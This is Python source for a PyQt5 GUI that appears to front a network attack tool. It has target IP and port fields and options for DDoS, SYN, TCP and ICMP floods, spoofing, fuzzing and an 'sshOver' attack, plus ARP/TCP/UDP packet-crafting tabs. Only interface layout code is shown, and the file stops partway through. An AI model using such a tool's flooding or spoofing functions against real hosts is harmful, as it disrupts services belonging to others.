# -*- coding: utf-8 -*-

# WARNING! All changes made in this file will be lost!

from PyQt5 import QtCore, QtGui, QtWidgets
import os
from scapy.layers.inet import IP, UDP, ICMP, TCP
from time import gmtime, strftime
import random
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import sys
from socket import *
from threading import Thread
import string
import re
import binascii
import gzip
import subprocess
import platform
import requests
import json
import urllib2,urllib
import hashlib
import subprocess
try:
    from cStringIO import StringIO
except:
    from StringIO import StringIO
from subprocess import check_output

Packet_Types = ["ARP", "IP", "IPv6"]
Packet_Protocols = ["DHCP", "DNS", "HTTP"]
Transport_Protocols = ["TCP", "UDP", "ICMP"]
UDP_Services = ["mdns", "bootpc", "bootps", "netbios_ns"]
DHCP_Msg_Type = ["ack", "request"]
IPv6_Types = ["ICMPv6", "Hop-by-Hop", "UDP"]
userhome = os.path.expanduser('~')
desktop = userhome + '/Desktop/'
processing_Flag = 0
hping3_Flag = 0

class Ui_MainWindow(object):

    def progress(self):
        self.attackProgress.setValue(self.value)
        self.value = self.value + 1

    def timerrepeat(self):
        self.timer1.start(150)
        if self.value==100:
            self.value=0

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(667, 586)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Fixed, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(MainWindow.sizePolicy().hasHeightForWidth())
        MainWindow.setSizePolicy(sizePolicy)
        MainWindow.setMinimumSize(QtCore.QSize(667, 586))
        MainWindow.setMaximumSize(QtCore.QSize(667, 586))
        MainWindow.setAutoFillBackground(False)
        self.logo = QtGui.QIcon()
        self.logo.addPixmap(QtGui.QPixmap("logo.png"))
        MainWindow.setWindowIcon(self.logo)
        MainWindow.setStyleSheet("QMainWindow{ border: 0px solid black; border-radius: 10px; background: rgb(156, 156, 156); }\n"
"QTabBar{ color: white; background: rgb(0, 0, 112); }\n"
"QPushButton{  color: white; background: rgb(0, 0, 112); }\n"
"#QLabel{  color: white; background: rgb(145, 180, 255);}\n"
"#QGroupBox{  color: white; background: rgb(145, 180, 255);}\n"
"#QHBoxLayout{  color: white; background: rgb(145, 180, 255);}\n"
"QStatusBar{  color: white; background: rgb(0, 0, 112); }\n"
"QMenuBar{  color: white; background: rgb(0, 0, 112); }\n"
"QTextBrowser{  color: white}\n"
"\n"
"\n"
"")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.gridLayout = QtWidgets.QGridLayout(self.centralwidget)
        self.gridLayout.setObjectName("gridLayout")
        self.Modules = QtWidgets.QTabWidget(self.centralwidget)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Expanding)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.Modules.sizePolicy().hasHeightForWidth())
        self.Modules.setSizePolicy(sizePolicy)
        self.Modules.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.Modules.setAutoFillBackground(False)
        self.Modules.setTabPosition(QtWidgets.QTabWidget.North)
        self.Modules.setElideMode(QtCore.Qt.ElideNone)
        self.Modules.setObjectName("Modules")
        self.attackW = QtWidgets.QWidget()
        self.attackW.setAccessibleName("")
        self.attackW.setObjectName("attackW")
        self.verticalLayout = QtWidgets.QVBoxLayout(self.attackW)
        self.verticalLayout.setObjectName("verticalLayout")
        self.aOpt = QtWidgets.QGroupBox(self.attackW)
        self.aOpt.setObjectName("aOpt")
        self.gridLayout_4 = QtWidgets.QGridLayout(self.aOpt)
        self.gridLayout_4.setObjectName("gridLayout_4")
        self.targetIp = QtWidgets.QLabel(self.aOpt)
        self.targetIp.setMinimumSize(QtCore.QSize(60, 0))
        self.targetIp.setMaximumSize(QtCore.QSize(16777215, 16777215))
        self.targetIp.setObjectName("targetIp")
        self.gridLayout_4.addWidget(self.targetIp, 0, 0, 1, 1)
        self.itargetIP = QtWidgets.QLineEdit(self.aOpt)
        self.itargetIP.setMinimumSize(QtCore.QSize(100, 0))
        self.itargetIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itargetIP.setStatusTip("")
        self.itargetIP.setInputMask("")
        self.itargetIP.setText("")
        self.itargetIP.setReadOnly(False)
        self.itargetIP.setObjectName("itargetIP")
        self.gridLayout_4.addWidget(self.itargetIP, 0, 1, 1, 1)
        self.targetPort = QtWidgets.QLabel(self.aOpt)
        self.targetPort.setMinimumSize(QtCore.QSize(60, 0))
        self.targetPort.setMaximumSize(QtCore.QSize(16777215, 16777215))
        self.targetPort.setObjectName("targetPort")
        self.gridLayout_4.addWidget(self.targetPort, 0, 3, 1, 1)
        self.itargetPort = QtWidgets.QLineEdit(self.aOpt)
        self.itargetPort.setMinimumSize(QtCore.QSize(50, 0))
        self.itargetPort.setMaximumSize(QtCore.QSize(50, 16777215))
        self.itargetPort.setObjectName("itargetPort")
        self.gridLayout_4.addWidget(self.itargetPort, 0, 4, 1, 1)
        self.packetNumber = QtWidgets.QLabel(self.aOpt)
        self.packetNumber.setMaximumSize(QtCore.QSize(16777215, 16777215))
        self.packetNumber.setObjectName("packetNumber")
        self.gridLayout_4.addWidget(self.packetNumber, 0, 6, 1, 1)
        spacerItem = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_4.addItem(spacerItem, 0, 5, 1, 1)
        spacerItem1 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_4.addItem(spacerItem1, 0, 2, 1, 1)
        self.ipacketNumber = QtWidgets.QSpinBox(self.aOpt)
        self.ipacketNumber.setMaximumSize(QtCore.QSize(60, 16777215))
        self.ipacketNumber.setMaximum(500)
        self.ipacketNumber.setSingleStep(1)
        self.ipacketNumber.setProperty("value", 1)
        self.ipacketNumber.setObjectName("ipacketNumber")
        self.gridLayout_4.addWidget(self.ipacketNumber, 0, 7, 1, 1)
        self.verticalLayout.addWidget(self.aOpt)
        self.aTypes = QtWidgets.QGroupBox(self.attackW)
        self.aTypes.setObjectName("aTypes")
        self.gridLayout_2 = QtWidgets.QGridLayout(self.aTypes)
        self.gridLayout_2.setObjectName("gridLayout_2")
        self.horizontalLayout_3 = QtWidgets.QHBoxLayout()
        self.horizontalLayout_3.setObjectName("horizontalLayout_3")
        self.verticalLayout_5 = QtWidgets.QVBoxLayout()
        self.verticalLayout_5.setObjectName("verticalLayout_5")
        self.Fuzzer = QtWidgets.QRadioButton(self.aTypes)
        self.Fuzzer.setObjectName("Fuzzer")
        self.verticalLayout_5.addWidget(self.Fuzzer)
        self.aSpoof = QtWidgets.QRadioButton(self.aTypes)
        self.aSpoof.setObjectName("aSpoof")
        self.verticalLayout_5.addWidget(self.aSpoof)
        self.sshOver = QtWidgets.QRadioButton(self.aTypes)
        self.sshOver.setObjectName("sshOver")
        self.verticalLayout_5.addWidget(self.sshOver)
        self.ddos = QtWidgets.QRadioButton(self.aTypes)
        self.ddos.setObjectName("ddos")
        self.verticalLayout_5.addWidget(self.ddos)
        self.horizontalLayout_3.addLayout(self.verticalLayout_5)
        self.verticalLayout_6 = QtWidgets.QVBoxLayout()
        self.verticalLayout_6.setObjectName("verticalLayout_6")
        self.tFlood = QtWidgets.QRadioButton(self.aTypes)
        self.tFlood.setObjectName("tFlood")
        self.verticalLayout_6.addWidget(self.tFlood)
        self.iFlood = QtWidgets.QRadioButton(self.aTypes)
        self.iFlood.setObjectName("iFlood")
        self.verticalLayout_6.addWidget(self.iFlood)
        self.sFlood = QtWidgets.QRadioButton(self.aTypes)
        self.sFlood.setObjectName("sFlood")
        self.verticalLayout_6.addWidget(self.sFlood)
        self.horizontalLayout_3.addLayout(self.verticalLayout_6)
        self.gridLayout_2.addLayout(self.horizontalLayout_3, 0, 0, 1, 1)
        self.verticalLayout.addWidget(self.aTypes)
        self.aButton = QtWidgets.QFrame(self.attackW)
        self.aButton.setMaximumSize(QtCore.QSize(16777215, 100))
        self.aButton.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.aButton.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.aButton.setFrameShadow(QtWidgets.QFrame.Raised)
        self.aButton.setLineWidth(1)
        self.aButton.setObjectName("aButton")
        self.gridLayout_3 = QtWidgets.QGridLayout(self.aButton)
        self.gridLayout_3.setContentsMargins(9, -1, -1, -1)
        self.gridLayout_3.setObjectName("gridLayout_3")
        self.attackB = QtWidgets.QPushButton(self.aButton)
        self.attackB.setMaximumSize(QtCore.QSize(100, 30))
        self.attackB.setAutoRepeat(False)
        #self.attackB.setAutoExclusive(False)
        self.attackB.setObjectName("attackB")
        self.bomb=QtGui.QIcon()
        self.bomb.addPixmap(QtGui.QPixmap("bomb.png"))
        self.attackB.setIcon(self.bomb)
        self.gridLayout_3.addWidget(self.attackB, 0, 0, 1, 1)
        self.graphicsView = QtWidgets.QGraphicsView(self.aButton)
        self.graphicsView.setMaximumSize(QtCore.QSize(100, 100))
        self.graphicsView.setStyleSheet("image: url(:/newPrefix/c1.gif);")
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.NoBrush)
        self.graphicsView.setBackgroundBrush(brush)
        self.graphicsView.setDragMode(QtWidgets.QGraphicsView.NoDrag)
        self.graphicsView.setObjectName("graphicsView")
        self.gridLayout_3.addWidget(self.graphicsView, 1, 0, 1, 1)
        self.verticalLayout.addWidget(self.aButton)
        self.attackProgress = QtWidgets.QProgressBar(self.attackW)
        self.attackProgress.setProperty("value", 0)
        self.attackProgress.setObjectName("attackProgress")
        self.attackProgress.setTextVisible(0)
        self.attackProgress.hide()
        self.value=0
        self.timer1=QtCore.QTimer()
        self.verticalLayout.addWidget(self.attackProgress)
        spacerItem2 = QtWidgets.QSpacerItem(20, 40, QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Expanding)
        self.verticalLayout.addItem(spacerItem2)
        self.Modules.addTab(self.attackW,self.bomb, "")
        self.generatorW = QtWidgets.QWidget()
        self.generatorW.setObjectName("generatorW")
        self.gridLayout_5 = QtWidgets.QGridLayout(self.generatorW)
        self.gridLayout_5.setObjectName("gridLayout_5")
        self.label_ptypes = QtWidgets.QLabel(self.generatorW)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_ptypes.setFont(font)
        self.label_ptypes.setStyleSheet("\n"
"color: rgb(0, 0, 127);")
        self.label_ptypes.setObjectName("label_ptypes")
        self.gridLayout_5.addWidget(self.label_ptypes, 0, 0, 1, 1)
        self.ptypesTab = QtWidgets.QTabWidget(self.generatorW)
        self.ptypesTab.setObjectName("ptypesTab")
        self.arpPage = QtWidgets.QWidget()
        self.arpPage.setObjectName("arpPage")
        self.arpOpt = QtWidgets.QGroupBox(self.arpPage)
        self.arpOpt.setGeometry(QtCore.QRect(10, 10, 600, 401))
        self.arpOpt.setObjectName("arpOpt")
        self.widget = QtWidgets.QWidget(self.arpOpt)
        self.widget.setGeometry(QtCore.QRect(10, 60, 551, 291))
        self.widget.setObjectName("widget")
        self.gridLayout_30 = QtWidgets.QGridLayout(self.widget)
        self.gridLayout_30.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_30.setObjectName("gridLayout_30")
        self.arpSrcIP = QtWidgets.QLabel(self.widget)
        self.arpSrcIP.setObjectName("arpSrcIP")
        self.gridLayout_30.addWidget(self.arpSrcIP, 2, 0, 1, 1)
        self.arpOp = QtWidgets.QLabel(self.widget)
        self.arpOp.setObjectName("arpOp")
        self.gridLayout_30.addWidget(self.arpOp, 1, 0, 1, 1)
        self.iarpHw = QtWidgets.QLineEdit(self.widget)
        self.iarpHw.setMinimumSize(QtCore.QSize(125, 0))
        self.iarpHw.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iarpHw.setObjectName("iarpHw")
        self.gridLayout_30.addWidget(self.iarpHw, 0, 4, 1, 1)
        self.arpPlength = QtWidgets.QLabel(self.widget)
        self.arpPlength.setObjectName("arpPlength")
        self.gridLayout_30.addWidget(self.arpPlength, 0, 0, 1, 1)
        spacerItem3 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_30.addItem(spacerItem3, 5, 3, 1, 1)
        spacerItem4 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_30.addItem(spacerItem4, 5, 1, 1, 1)
        spacerItem5 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_30.addItem(spacerItem5, 0, 2, 1, 1)
        self.arpHw = QtWidgets.QLabel(self.widget)
        self.arpHw.setObjectName("arpHw")
        self.gridLayout_30.addWidget(self.arpHw, 0, 3, 1, 1)
        self.iarpOp = QtWidgets.QLineEdit(self.widget)
        self.iarpOp.setMinimumSize(QtCore.QSize(125, 0))
        self.iarpOp.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iarpOp.setObjectName("iarpOp")
        self.gridLayout_30.addWidget(self.iarpOp, 1, 1, 1, 1)
        self.arpPro = QtWidgets.QLabel(self.widget)
        self.arpPro.setObjectName("arpPro")
        self.gridLayout_30.addWidget(self.arpPro, 1, 3, 1, 1)
        spacerItem6 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_30.addItem(spacerItem6, 5, 0, 1, 1)
        self.arpSend = QtWidgets.QPushButton(self.widget)
        self.arpSend.setObjectName("arpSend")
        self.gridLayout_30.addWidget(self.arpSend, 5, 2, 1, 1)
        self.envelope=QtGui.QIcon()
        self.envelope.addPixmap(QtGui.QPixmap("envelope.png"))
        self.arpSend.setIcon(self.envelope)
        spacerItem7 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_30.addItem(spacerItem7, 5, 4, 1, 1)
        self.iarpProLength = QtWidgets.QLineEdit(self.widget)
        self.iarpProLength.setMinimumSize(QtCore.QSize(125, 0))
        self.iarpProLength.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iarpProLength.setObjectName("iarpProLength")
        self.gridLayout_30.addWidget(self.iarpProLength, 0, 1, 1, 1)
        self.iarpPtype = QtWidgets.QLineEdit(self.widget)
        self.iarpPtype.setMinimumSize(QtCore.QSize(125, 0))
        self.iarpPtype.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iarpPtype.setObjectName("iarpPtype")
        self.gridLayout_30.addWidget(self.iarpPtype, 1, 4, 1, 1)
        self.iarpSrcIP = QtWidgets.QLineEdit(self.widget)
        self.iarpSrcIP.setMinimumSize(QtCore.QSize(125, 0))
        self.iarpSrcIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iarpSrcIP.setObjectName("iarpSrcIP")
        self.gridLayout_30.addWidget(self.iarpSrcIP, 2, 1, 1, 1)
        self.iarpSrcMac = QtWidgets.QLineEdit(self.widget)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.iarpSrcMac.sizePolicy().hasHeightForWidth())
        self.iarpSrcMac.setSizePolicy(sizePolicy)
        self.iarpSrcMac.setMinimumSize(QtCore.QSize(125, 0))
        self.iarpSrcMac.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iarpSrcMac.setObjectName("iarpSrcMac")
        self.gridLayout_30.addWidget(self.iarpSrcMac, 2, 4, 1, 1)
        self.arpSrcMac = QtWidgets.QLabel(self.widget)
        self.arpSrcMac.setObjectName("arpSrcMac")
        self.gridLayout_30.addWidget(self.arpSrcMac, 2, 3, 1, 1)
        self.arpDest = QtWidgets.QLabel(self.widget)
        self.arpDest.setObjectName("arpDest")
        self.gridLayout_30.addWidget(self.arpDest, 3, 0, 1, 1)
        self.iarpDestIP = QtWidgets.QLineEdit(self.widget)
        self.iarpDestIP.setMinimumSize(QtCore.QSize(125, 0))
        self.iarpDestIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iarpDestIP.setObjectName("iarpDestIP")
        self.gridLayout_30.addWidget(self.iarpDestIP, 3, 1, 1, 1)
        self.allLabel_2 = QtWidgets.QLabel(self.arpOpt)
        self.allLabel_2.setGeometry(QtCore.QRect(140, 30, 311, 16))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.allLabel_2.setFont(font)
        self.allLabel_2.setStyleSheet("\n" + "color: rgb(0, 0, 127);")
        self.allLabel_2.setObjectName("allLabel_2")
        self.ptypesTab.addTab(self.arpPage, "")
        self.tcpPage = QtWidgets.QWidget()
        self.tcpPage.setObjectName("tcpPage")
        self.widget1 = QtWidgets.QWidget(self.tcpPage)
        self.widget1.setGeometry(QtCore.QRect(10, 40, 571, 371))
        self.widget1.setObjectName("widget1")
        self.gridLayout_28 = QtWidgets.QGridLayout(self.widget1)
        self.gridLayout_28.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_28.setObjectName("gridLayout_28")
        spacerItem8 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_28.addItem(spacerItem8, 0, 2, 1, 1)
        self.tcpDstPort = QtWidgets.QLabel(self.widget1)
        self.tcpDstPort.setObjectName("tcpDstPort")
        self.gridLayout_28.addWidget(self.tcpDstPort, 1, 0, 1, 1)
        self.itcpFlag = QtWidgets.QLineEdit(self.widget1)
        self.itcpFlag.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpFlag.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpFlag.setObjectName("itcpFlag")
        self.gridLayout_28.addWidget(self.itcpFlag, 1, 4, 1, 1)
        self.tcpCheck = QtWidgets.QLabel(self.widget1)
        self.tcpCheck.setObjectName("tcpCheck")
        self.gridLayout_28.addWidget(self.tcpCheck, 3, 3, 1, 1)
        spacerItem9 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_28.addItem(spacerItem9, 6, 0, 1, 1)
        self.itcpDstPort = QtWidgets.QLineEdit(self.widget1)
        self.itcpDstPort.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpDstPort.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpDstPort.setBaseSize(QtCore.QSize(0, 0))
        self.itcpDstPort.setObjectName("itcpDstPort")
        self.gridLayout_28.addWidget(self.itcpDstPort, 1, 1, 1, 1)
        spacerItem10 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_28.addItem(spacerItem10, 6, 3, 1, 1)
        self.tcpSeq = QtWidgets.QLabel(self.widget1)
        self.tcpSeq.setObjectName("tcpSeq")
        self.gridLayout_28.addWidget(self.tcpSeq, 2, 0, 1, 1)
        self.tcpAck = QtWidgets.QLabel(self.widget1)
        self.tcpAck.setObjectName("tcpAck")
        self.gridLayout_28.addWidget(self.tcpAck, 3, 0, 1, 1)
        self.tcpRes = QtWidgets.QLabel(self.widget1)
        self.tcpRes.setObjectName("tcpRes")
        self.gridLayout_28.addWidget(self.tcpRes, 0, 3, 1, 1)
        self.tcpDestIP = QtWidgets.QLabel(self.widget1)
        self.tcpDestIP.setObjectName("tcpDestIP")
        self.gridLayout_28.addWidget(self.tcpDestIP, 5, 3, 1, 1)
        spacerItem11 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_28.addItem(spacerItem11, 6, 4, 1, 1)
        spacerItem12 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_28.addItem(spacerItem12, 6, 1, 1, 1)
        self.itcpSeq = QtWidgets.QLineEdit(self.widget1)
        self.itcpSeq.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpSeq.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpSeq.setBaseSize(QtCore.QSize(100, 0))
        self.itcpSeq.setObjectName("itcpSeq")
        self.gridLayout_28.addWidget(self.itcpSeq, 2, 1, 1, 1)
        self.tcpFlag = QtWidgets.QLabel(self.widget1)
        self.tcpFlag.setObjectName("tcpFlag")
        self.gridLayout_28.addWidget(self.tcpFlag, 1, 3, 1, 1)
        self.tcpSrcPort = QtWidgets.QLabel(self.widget1)
        self.tcpSrcPort.setObjectName("tcpSrcPort")
        self.gridLayout_28.addWidget(self.tcpSrcPort, 0, 0, 1, 1)
        self.tcpSend = QtWidgets.QPushButton(self.widget1)
        self.tcpSend.setObjectName("tcpSend")
        self.gridLayout_28.addWidget(self.tcpSend, 6, 2, 1, 1)
        self.envelope=QtGui.QIcon()
        self.envelope.addPixmap(QtGui.QPixmap("envelope.png"))
        self.tcpSend.setIcon(self.envelope)
        self.itcpOff = QtWidgets.QLineEdit(self.widget1)
        self.itcpOff.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpOff.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpOff.setObjectName("itcpOff")
        self.gridLayout_28.addWidget(self.itcpOff, 4, 1, 1, 1)
        self.tcpUrg = QtWidgets.QLabel(self.widget1)
        self.tcpUrg.setObjectName("tcpUrg")
        self.gridLayout_28.addWidget(self.tcpUrg, 4, 3, 1, 1)
        self.tcpWindow = QtWidgets.QLabel(self.widget1)
        self.tcpWindow.setObjectName("tcpWindow")
        self.gridLayout_28.addWidget(self.tcpWindow, 2, 3, 1, 1)
        self.itcpDstIP = QtWidgets.QLineEdit(self.widget1)
        self.itcpDstIP.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpDstIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpDstIP.setObjectName("itcpDstIP")
        self.gridLayout_28.addWidget(self.itcpDstIP, 5, 4, 1, 1)
        self.itcpCheck = QtWidgets.QLineEdit(self.widget1)
        self.itcpCheck.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpCheck.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpCheck.setObjectName("itcpCheck")
        self.gridLayout_28.addWidget(self.itcpCheck, 3, 4, 1, 1)
        self.itcpUrg = QtWidgets.QLineEdit(self.widget1)
        self.itcpUrg.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpUrg.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpUrg.setObjectName("itcpUrg")
        self.gridLayout_28.addWidget(self.itcpUrg, 4, 4, 1, 1)
        self.tcpOff = QtWidgets.QLabel(self.widget1)
        self.tcpOff.setObjectName("tcpOff")
        self.gridLayout_28.addWidget(self.tcpOff, 4, 0, 1, 1)
        self.itcpRes = QtWidgets.QLineEdit(self.widget1)
        self.itcpRes.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpRes.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpRes.setInputMethodHints(QtCore.Qt.ImhNone)
        self.itcpRes.setObjectName("itcpRes")
        self.gridLayout_28.addWidget(self.itcpRes, 0, 4, 1, 1)
        self.itcpSrcPort = QtWidgets.QLineEdit(self.widget1)
        self.itcpSrcPort.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpSrcPort.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpSrcPort.setObjectName("itcpSrcPort")
        self.gridLayout_28.addWidget(self.itcpSrcPort, 0, 1, 1, 1)
        self.itcpAck = QtWidgets.QLineEdit(self.widget1)
        self.itcpAck.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpAck.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpAck.setObjectName("itcpAck")
        self.gridLayout_28.addWidget(self.itcpAck, 3, 1, 1, 1)
        self.itcpWin = QtWidgets.QLineEdit(self.widget1)
        self.itcpWin.setMinimumSize(QtCore.QSize(100, 0))
        self.itcpWin.setMaximumSize(QtCore.QSize(100, 16777215))
        self.itcpWin.setObjectName("itcpWin")
        self.gridLayout_28.addWidget(self.itcpWin, 2, 4, 1, 1)
        self.allLabel_3 = QtWidgets.QLabel(self.tcpPage)
        self.allLabel_3.setGeometry(QtCore.QRect(140, 20, 311, 16))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.allLabel_3.setFont(font)
        self.allLabel_3.setStyleSheet("\n" + "color: rgb(0, 0, 127);")
        self.allLabel_3.setObjectName("allLabel_3")
        self.ptypesTab.addTab(self.tcpPage, "")
        self.udpPage = QtWidgets.QWidget()
        self.udpPage.setObjectName("udpPage")
        self.widget2 = QtWidgets.QWidget(self.udpPage)
        self.widget2.setGeometry(QtCore.QRect(6, 41, 571, 231))
        self.widget2.setObjectName("widget2")
        self.gridLayout_29 = QtWidgets.QGridLayout(self.widget2)
        self.gridLayout_29.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_29.setObjectName("gridLayout_29")
        spacerItem13 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_29.addItem(spacerItem13, 4, 0, 1, 1)
        spacerItem14 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_29.addItem(spacerItem14, 4, 3, 1, 1)
        spacerItem15 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_29.addItem(spacerItem15, 4, 4, 1, 1)
        self.udpCheck = QtWidgets.QLabel(self.widget2)
        self.udpCheck.setObjectName("udpCheck")
        self.gridLayout_29.addWidget(self.udpCheck, 1, 3, 1, 1)
        self.udpLength = QtWidgets.QLabel(self.widget2)
        self.udpLength.setObjectName("udpLength")
        self.gridLayout_29.addWidget(self.udpLength, 1, 0, 1, 1)
        self.udpSrcPort = QtWidgets.QLabel(self.widget2)
        self.udpSrcPort.setObjectName("udpSrcPort")
        self.gridLayout_29.addWidget(self.udpSrcPort, 0, 0, 1, 1)
        self.iudpSrcPort = QtWidgets.QLineEdit(self.widget2)
        self.iudpSrcPort.setMinimumSize(QtCore.QSize(100, 0))
        self.iudpSrcPort.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iudpSrcPort.setObjectName("iudpSrcPort")
        self.gridLayout_29.addWidget(self.iudpSrcPort, 0, 1, 1, 1)
        self.udpDstPort = QtWidgets.QLabel(self.widget2)
        self.udpDstPort.setObjectName("udpDstPort")
        self.gridLayout_29.addWidget(self.udpDstPort, 0, 3, 1, 1)
        self.iudpLength = QtWidgets.QLineEdit(self.widget2)
        self.iudpLength.setMinimumSize(QtCore.QSize(100, 0))
        self.iudpLength.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iudpLength.setBaseSize(QtCore.QSize(0, 0))
        self.iudpLength.setObjectName("iudpLength")
        self.gridLayout_29.addWidget(self.iudpLength, 1, 1, 1, 1)
        self.iudpCheck = QtWidgets.QLineEdit(self.widget2)
        self.iudpCheck.setMinimumSize(QtCore.QSize(100, 0))
        self.iudpCheck.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iudpCheck.setObjectName("iudpCheck")
        self.gridLayout_29.addWidget(self.iudpCheck, 1, 4, 1, 1)
        spacerItem16 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_29.addItem(spacerItem16, 4, 1, 1, 1)
        spacerItem17 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_29.addItem(spacerItem17, 0, 2, 1, 1)
        self.iudpDstPort = QtWidgets.QLineEdit(self.widget2)
        self.iudpDstPort.setMinimumSize(QtCore.QSize(100, 0))
        self.iudpDstPort.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iudpDstPort.setBaseSize(QtCore.QSize(0, 0))
        self.iudpDstPort.setObjectName("iudpDstPort")
        self.gridLayout_29.addWidget(self.iudpDstPort, 0, 4, 1, 1)
        self.udpSend = QtWidgets.QPushButton(self.widget2)
        self.udpSend.setObjectName("udpSend")
        self.gridLayout_29.addWidget(self.udpSend, 4, 2, 1, 1)
        self.envelope=QtGui.QIcon()
        self.envelope.addPixmap(QtGui.QPixmap("envelope.png"))
        self.udpSend.setIcon(self.envelope)
        self.arpDest_2 = QtWidgets.QLabel(self.widget2)
        self.arpDest_2.setObjectName("arpDest_2")
        self.gridLayout_29.addWidget(self.arpDest_2, 3, 0, 1, 1)
        self.iarpDestIP_2 = QtWidgets.QLineEdit(self.widget2)
        self.iarpDestIP_2.setMinimumSize(QtCore.QSize(100, 0))
        self.iarpDestIP_2.setMaximumSize(QtCore.QSize(100, 16777215))
        self.iarpDestIP_2.setObjectName("iarpDestIP_2")
        self.gridLayout_29.addWidget(self.iarpDestIP_2, 3, 1, 1, 1)
        self.allLabel_4 = QtWidgets.QLabel(self.udpPage)
        self.allLabel_4.setGeometry(QtCore.QRect(140, 20, 311, 16))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.allLabel_4.setFont(font)
        self.allLabel_4.setStyleSheet("\n" + "color: rgb(0, 0, 127);")
